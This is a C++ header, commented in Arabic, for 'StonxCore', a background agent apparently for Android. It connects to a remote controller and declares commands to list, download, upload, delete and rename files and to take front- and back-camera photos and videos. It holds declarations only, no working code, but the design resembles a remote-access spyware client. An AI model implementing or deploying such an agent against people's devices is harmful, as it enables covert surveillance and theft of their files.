#pragma once
#include <string>
#include <atomic>
#include <thread>
#include <functional>
#include <mutex>
#include <unordered_map>

// ════════════════════════════════════════════════════════════════════════════
// StonxCore — القلب الرئيسي للـ Agent
// يعمل في thread خلفي مستقل، يتصل بالـ Controller ويعالج الأوامر
// ════════════════════════════════════════════════════════════════════════════

class StonxCore {
public:
    // ── callback يُرسَل للـ Java عبر JNI ──────────────────────────────────
    struct Callbacks {
        std::function<void(bool connected)>          on_connection_changed;
        std::function<void(const std::string& type, const std::string& detail)> on_op_start;
        std::function<void(const std::string& type, bool success)>              on_op_end;
        std::function<void(int count)>               on_pending_changed;
        std::function<void(const std::string& msg)>  on_log;
    };

    // ── Camera callback (يُستدعى من Java عبر JNI عند نتيجة الكاميرا) ─────
    using CameraCallback = std::function<void(bool success,
                                              const std::string& path_or_error)>;

    explicit StonxCore(const std::string& files_dir,
                       const std::string& host,
                       uint16_t           port,
                       const std::string& psk,
                       Callbacks          cbs);
    ~StonxCore();

    StonxCore(const StonxCore&) = delete;
    StonxCore& operator=(const StonxCore&) = delete;

    void start();
    void stop();
    bool is_running() const;

    // ── يُستدعى من JNI عند وصول نتيجة الكاميرا ────────────────────────────
    void on_camera_result(const std::string& op_id,
                          bool success,
                          const std::string& path_or_error);

private:
    void run_loop();
    void connect_once();
    void do_auth(int fd);
    void handle_commands(int fd);
    void handle_command(int fd, const std::string& json);

    // ── handlers لكل أمر ─────────────────────────────────────────────────
    void cmd_ls(int fd, const std::string& op_id, const std::string& json);
    void cmd_download(int fd, const std::string& op_id, const std::string& json);
    void cmd_sync(int fd, const std::string& op_id, const std::string& json);
    void cmd_upload(int fd, const std::string& op_id, const std::string& json);
    void cmd_delete_file(int fd, const std::string& op_id, const std::string& json);
    void cmd_delete_folder(int fd, const std::string& op_id, const std::string& json);
    void cmd_rename(int fd, const std::string& op_id, const std::string& json);
    void cmd_front_photo(int fd, const std::string& op_id);
    void cmd_back_photo(int fd, const std::string& op_id);
    void cmd_front_video(int fd, const std::string& op_id, int duration_sec);
    void cmd_back_video(int fd, const std::string& op_id, int duration_sec);

    // ── helpers ───────────────────────────────────────────────────────────
    void log(const std::string& msg);
    void notify_connection(bool c);
    void notify_op_start(const std::string& type, const std::string& detail);
    void notify_op_end(const std::string& type, bool ok);
    int  backoff_sec(int attempt);

    // ── أعضاء ─────────────────────────────────────────────────────────────
    std::string   m_files_dir;
    std::string   m_host;
    uint16_t      m_port;
    std::string   m_psk;
    Callbacks     m_cbs;

    std::atomic<bool> m_running{false};
    std::thread       m_thread;
    std::atomic<int>  m_fd{-1};

    // ── Camera listeners (للربط مع JNI) ──────────────────────────────────
    std::mutex                                     m_cam_mutex;
    std::unordered_map<std::string, CameraCallback> m_cam_listeners;
};
